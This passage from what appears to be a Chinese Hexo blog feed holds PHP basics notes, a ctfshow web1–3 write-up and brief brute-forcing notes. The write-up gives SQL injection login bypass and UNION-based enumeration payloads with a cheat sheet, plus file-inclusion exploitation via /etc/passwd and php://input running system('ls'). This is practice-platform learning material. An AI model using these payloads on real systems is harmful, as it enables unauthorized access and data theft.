function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//可见只有""中使用&#123;&#125;将变量包裹才可以输出变量  //输出语句中要用多个引号时，需要用反斜杠\（转义字符）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203171929565.png"></p><h3 id="4）定界符-lt-lt-lt"><a href="#4）定界符-lt-lt-lt" class="headerlink" title="4）定界符&lt;&lt;&lt;"></a>4）定界符&lt;&lt;&lt;</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php$m&#x3D;1988;$a&#x3D;&lt;&lt;&lt;bbb啥地&#39;;&#39;方;&#39;&#39;&#39;就&#123;$m&#125;开始&quot;fgh&quot;打sddsadfbbb;var_dump($a);?&gt;&#x2F;&#x2F;可以使用&#123;&#125;插入变量输出&#x2F;&#x2F;还可以包含单双引号，当做普通字符输出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203171952687.png"></p><h3 id="5）数组"><a href="#5）数组" class="headerlink" title="5）数组"></a>5）数组</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203171954143.png"></p><p>以后再讲</p><h3 id="6）object（对象）"><a href="#6）object（对象）" class="headerlink" title="6）object（对象）"></a>6）object（对象）</h3><p>以后再讲</p><h3 id="7）resource（资源）"><a href="#7）resource（资源）" class="headerlink" title="7）resource（资源）"></a>7）resource（资源）</h3><p>以后再讲</p><h3 id="8）NULL"><a href="#8）NULL" class="headerlink" title="8）NULL"></a>8）NULL</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203171958538.png"></p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a;var_dump($a);?&gt;&#x2F;&#x2F;未定义、未赋值、值为NULL的(大小写都可以) 变量值 都是NULL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203171959319.png"></p><h3 id="9）unset-变量销毁"><a href="#9）unset-变量销毁" class="headerlink" title="9）unset();变量销毁"></a>9）unset();变量销毁</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a;unset($a);var_dump($a);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203171959319.png"></p><h2 id="变量类型相互转换"><a href="#变量类型相互转换" class="headerlink" title="变量类型相互转换"></a>变量类型相互转换</h2><h3 id="1）自动类型转换"><a href="#1）自动类型转换" class="headerlink" title="1）自动类型转换"></a>1）自动类型转换</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172006711.png"></p><p>举例</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a&#x3D;&quot;猫&quot;;var_dump($a);$a+&#x3D;1;var_dump($a);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172012109.png"></p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a&#x3D;&quot;猫&quot;;echo &#39;&lt;br&#x2F;&gt;&#39;;$b&#x3D;(int)$a;var_dump($b);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172015746.png"></p><h3 id="2）强制类型转换"><a href="#2）强制类型转换" class="headerlink" title="2）强制类型转换"></a>2）强制类型转换</h3><p><img src="C:/Users/13912/AppData/Roaming/Typora/typora-user-images/image-20220317200833439.png" alt="image-20220317200833439"></p><h2 id="变量类型的测试函数"><a href="#变量类型的测试函数" class="headerlink" title="变量类型的测试函数"></a>变量类型的测试函数</h2><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172017747.png"></p><h1 id="PHP第六节-常量与变量"><a href="#PHP第六节-常量与变量" class="headerlink" title="PHP第六节_常量与变量_"></a>PHP第六节_常量与变量_</h1><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172019390.png"></p><h3 id="1）定义和使用"><a href="#1）定义和使用" class="headerlink" title="1）定义和使用"></a>1）定义和使用</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203181957283.png"></p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203182002369.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'MY_NAME'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'看云'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">MY_NAME</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203182005332.png"></p><h3 id="2）常量的命名"><a href="#2）常量的命名" class="headerlink" title="2）常量的命名"></a>2）常量的命名</h3><p><img src="C:/Users/13912/AppData/Roaming/Typora/typora-user-images/image-20220318200802563.png" alt="image-20220318200802563"></p><h3 id="3）常量和变量的区别"><a href="#3）常量和变量的区别" class="headerlink" title="3）常量和变量的区别"></a>3）常量和变量的区别</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203182008630.png"></p><h3 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h3><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203182015872.png"></p><h4 id="查看预定义常量语句"><a href="#查看预定义常量语句" class="headerlink" title="查看预定义常量语句"></a>查看预定义常量语句</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">get_defind_contants</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//预定义常量是不区分大小写的，自己定义的是严格区分大小写的</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="举例查看"><a href="#举例查看" class="headerlink" title="举例查看"></a>举例查看</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">__LINE__</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_OS</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_VERSION</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> __file__<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> __line__<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token comment">//print_r(get_defined_constants());</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203182041854.png"></p><h3 id="八个魔术常量"><a href="#八个魔术常量" class="headerlink" title="八个魔术常量"></a>八个魔术常量</h3><p><a href="https://www.php.net/manual/zh/language.constants.magic.php">魔术常量</a></p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h4 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h4><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203182050772.png"></p><h4 id="1）算术运算符"><a href="#1）算术运算符" class="headerlink" title="1）算术运算符"></a>1）算术运算符</h4><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203182052301.png"></p><center>  tip：变量被取反并不会影响到变量本身  </center><p><strong>注意</strong>：<img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203182103165.png"></p><h4 id="2-字符串运算符"><a href="#2-字符串运算符" class="headerlink" title="2)字符串运算符"></a>2)字符串运算符</h4><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203182105744.png"></p><p>举例：</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203182106033.png"></p><h4 id="3-赋值运算符"><a href="#3-赋值运算符" class="headerlink" title="3)赋值运算符"></a>3)赋值运算符</h4><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203182106703.png"></p><h5 id=""><a href="#" class="headerlink" title=".="></a>.=</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//.= 在php中是字符串连接的意思</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'bc'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203182120412.png"></p><h4 id="4）比较运算符"><a href="#4）比较运算符" class="headerlink" title="4）比较运算符"></a>4）比较运算符</h4><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203192118631.png"></p><p>举例：</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203192128163.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1112</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1112'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">===</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token comment">//!=（不等）与!==（不全等）的区别</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">!=</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//false</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">!==</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203192153128.png"></p><h4 id="5）逻辑运算符"><a href="#5）逻辑运算符" class="headerlink" title="5）逻辑运算符"></a>5）逻辑运算符</h4><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203192144343.png"></p><h5 id="概念与要求："><a href="#概念与要求：" class="headerlink" title="概念与要求："></a>概念与要求：</h5><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203192148754.png"></p><center>   <u>        && ||的优先级别比 and or 高    </u></center><h5 id="逻辑非的运算规则"><a href="#逻辑非的运算规则" class="headerlink" title="逻辑非的运算规则"></a>逻辑非的运算规则</h5><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203192209744.png"></p><h4 id="6-其他运算符"><a href="#6-其他运算符" class="headerlink" title="6)其他运算符"></a>6)其他运算符</h4><ol><li> 三元运算符  ？： </li></ol><p>   运算规则：<img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203192220092.png"></p><ol start="2"><li> ``</li></ol><p>   <img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203192232082.png"></p><ol start="3"><li> @</li></ol><p>   <img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203192239683.png"></p><ol start="4"><li><p> =&gt;  （学到数组时学习）</p></li><li><p>-&gt;</p></li><li><p>instanceof</p></li></ol><h4 id="7-运算符的优先级"><a href="#7-运算符的优先级" class="headerlink" title="7)运算符的优先级"></a>7)运算符的优先级</h4><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203222157116.png"></p><p>短路问题：</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203232142881.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$a</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">++</span><span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token comment">//短路：上面的++$b被短路 </span> <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token comment">//b=1;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="PHP" scheme="http://kannikanyun.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>ctfShow_web_学习记录</title>
    <link href="http://kannikanyun.github.io/2022/03/13/ctfShow-web-1~3/"/>
    <id>http://kannikanyun.github.io/2022/03/13/ctfShow-web-1~3/</id>
    <published>2022-03-13T13:33:30.000Z</published>
    <updated>2022-03-24T13:50:01.337Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-web-签到题"><a href="#1-web-签到题" class="headerlink" title="1.web 签到题"></a>1.web 签到题</h1><p>题目场景：<img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203132136517.png"></p><p>思路：页面描述很简单，选择查看源代码</p><h3 id="看到类似flag，提交–-gt-失败"><a href="#看到类似flag，提交–-gt-失败" class="headerlink" title="看到类似flag，提交–&gt;失败"></a>看到类似flag，提交–&gt;失败</h3><p>flag应该是它，但是有点复杂无规律—&gt;突然想到：符合base64条件</p><p>尝试：成功得到flag</p><h1 id="2-ctf-show-web2"><a href="#2-ctf-show-web2" class="headerlink" title="2.ctf.show_web2"></a>2.ctf.show_web2</h1><p><a href="https://blog.csdn.net/qq_34638225/article/details/81269281?ops_request_misc=&request_id=&biz_id=102&utm_term=sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-81269281.142%5Ev2%5Epc_search_result_control_group,143%5Ev4%5Econtrol&spm=1018.2226.3001.4187">SQL理解学习</a></p><h2 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h2><p>SQL万能密码<u>‘ or 1 = 1 #</u>与<u>(a’ or true #)</u>介绍：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> uername<span class="token operator">=</span><span class="token string">' '</span> or1<span class="token operator">=</span><span class="token number">1</span><span class="token comment">#' and password=balabala</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>“#”为注释符，则语句相当于：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>即绕过密码登录</strong></p><h2 id="知识点2"><a href="#知识点2" class="headerlink" title="知识点2"></a>知识点2</h2><p>GET为url传参，POST为页面内部传参</p><p>判断字段：</p><pre class="line-numbers language-none"><code class="language-none">&#39; or 1&#x3D;1 union select 1,2,3 #只有中间位2，改变时页面回显内容会跟着一起改变，必须是三个数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203142146906.png"></p><p>说明有三个字段</p><p>现在要做顺序就是爆库，爆表，爆字段，爆值</p><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172143749.png"></p><h3 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">"web2"</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172149690.png"></p><h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">"flag"</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172159139.png"></p><p><u>以下这一句是查错多余的<u/></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> column_name<span class="token operator">=</span><span class="token string">"flag"</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172152227.png"></p><h3 id="爆字段值"><a href="#爆字段值" class="headerlink" title="爆字段值"></a>爆字段值</h3><center>    直接简单查看</center><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>flag<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> flag<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172154394.png"></p><center>    此处贴几个常用基本语句</center><table><thead><tr><th>爆库</th><th>union select 1,2,3,database(); #   //这里得看有多少字段</th></tr></thead><tbody><tr><td>爆表</td><td>union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database(); #</td></tr><tr><td>爆字段</td><td>union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=”表名”; #</td></tr><tr><td>爆值</td><td>union select 1,2,3,字段 from 表名; #</td></tr></tbody></table><h1 id="3-ctf-show-web3"><a href="#3-ctf-show-web3" class="headerlink" title="3.ctf.show_web3"></a>3.ctf.show_web3</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><center>    <u>看到关键字include（），想到可能与PHP文件包含有关</u></center><p><strong>并且这个文件包含是利用了GET方式在url中进行传参</strong></p><p>查看PHP的include(),了解到了PHP伪协议的用法</p><h3 id="点这里了解：文件包含漏洞与PHP伪协议结合"><a href="#点这里了解：文件包含漏洞与PHP伪协议结合" class="headerlink" title="点这里了解：文件包含漏洞与PHP伪协议结合"></a><em>点这里了解：</em><u><a href="https://blog.csdn.net/zpy1998zpy/article/details/80598768?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164770178116780271973319%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164770178116780271973319&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-80598768.142%5Ev2%5Epc_search_result_control_group,143%5Ev4%5Econtrol&utm_term=PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&spm=1018.2226.3001.4187">文件包含漏洞与PHP伪协议结合</a></u></h3><blockquote><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>这个协议的利用方法是 将要执行的语法php代码写在post中提交，不用键与值的形式，只写代码即可</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">条件：allow_url_include=Onallow_url_fopen-Off/On<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><h3 id="1-先使用-etc-passwd"><a href="#1-先使用-etc-passwd" class="headerlink" title="1.先使用//etc/passwd"></a>1.先使用//etc/passwd</h3><p>尝试查看其他页面</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203192350340.png"></p><h2 id="2-使用php-input"><a href="#2-使用php-input" class="headerlink" title="2.使用php://input"></a>2.使用php://input</h2><p>利用post查看当前目录结构</p><blockquote><p>BP抓包，body中写入</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203192355976.png"></p><h2 id="3-查看ctf-go-go-go文件"><a href="#3-查看ctf-go-go-go文件" class="headerlink" title="3.查看ctf_go_go_go文件"></a>3.查看ctf_go_go_go文件</h2><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203192359089.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="http://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>web_口令爆破_学习笔记</title>
    <link href="http://kannikanyun.github.io/2022/03/06/web-%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://kannikanyun.github.io/2022/03/06/web-%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-03-06T13:31:35.000Z</published>
    <updated>2022-03-17T14:16:15.195Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第一节：常见协议"><a href="#第一节：常见协议" class="headerlink" title="第一节：常见协议"></a>第一节：常见协议</h1><h2 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1.暴力破解"></a>1.暴力破解</h2><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172214946.png"></p><p><strong>理解：使用字典去猜用户的用户名与密码（通过工具去爆破）</strong></p><h2 id="2-常见端口"><a href="#2-常见端口" class="headerlink" title="2.常见端口"></a>2.常见端口</h2><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172214773.png"></p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172215895.png"></p><h2 id="3-爆破工具hydra"><a href="#3-爆破工具hydra" class="headerlink" title="3.爆破工具hydra"></a>3.爆破工具hydra</h2><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172215477.png"></p><h1 id="第二节：字典说明"><a href="#第二节：字典说明" class="headerlink" title="第二节：字典说明"></a>第二节：字典说明</h1><p>1.暴力破解简单说明：<br><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172215285.png"><br>2.根据提供信息生成密码：<br><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172216452.png"><br>3.白鹿社工字典生成器（github)<br>4.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="口令爆破" scheme="http://kannikanyun.github.io/tags/%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs摸坑</title>
    <link href="http://kannikanyun.github.io/2022/02/25/sqli-labs%E6%91%B8%E5%9D%91/"/>
    <id>http://kannikanyun.github.io/2022/02/25/sqli-labs%E6%91%B8%E5%9D%91/</id>
    <published>2022-02-25T00:43:14.000Z</published>
    <updated>2022-02-25T00:48:39.847Z</updated>
    
